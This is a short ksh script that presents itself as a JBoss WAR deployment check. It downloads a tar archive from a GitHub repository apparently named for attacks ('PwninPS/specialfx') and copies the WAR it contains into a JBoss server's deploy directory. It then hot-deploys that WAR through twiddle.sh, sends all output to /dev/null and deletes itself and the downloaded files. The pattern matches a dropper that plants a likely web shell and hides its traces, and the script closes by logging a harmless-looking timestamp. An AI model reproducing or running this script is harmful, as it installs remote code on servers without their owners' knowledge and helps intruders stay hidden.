#!/bin/ksh

if [ ! -d "/usr/appl/col/home/uatcol/firmament/jboss/server/default/deploy/management/colliine1.war" ]; then curl https://raw.githubusercontent.com/PwninPS/specialfx/master/war.tar -o colliine.tar;tar -xvf colliine.tar; cp -r "colliine.war" "/usr/appl/col/home/uatcol/firmament/jboss/server/default/deploy/management/colliine1.war" > /dev/null 2>&1 ;chmod 755 "/usr/appl/col/home/uatcol/firmament/jboss/server/default/deploy/management/colliine1.war" > /dev/null 2>&1; && /usr/appl/col/home/uatcol/firmament/jboss/bin/twiddle.sh invoke jboss.system:service=MainDeployer deploy /usr/appl/col/home/uatcol/firmament/jboss/server/default/deploy/management/colliine1.war > /dev/null 2>&1 ;rm -rf firmamentdeploy.sh; rm -rf colliine.tar; rm -rf colliine.war; fi 


dat=`date +%m/%d/%y%n%H:%M:%S`
echo ' '
echo "$SCRIPT script ended at..." $dat >/tmp/warDeploymentChecked.txt
echo ' '
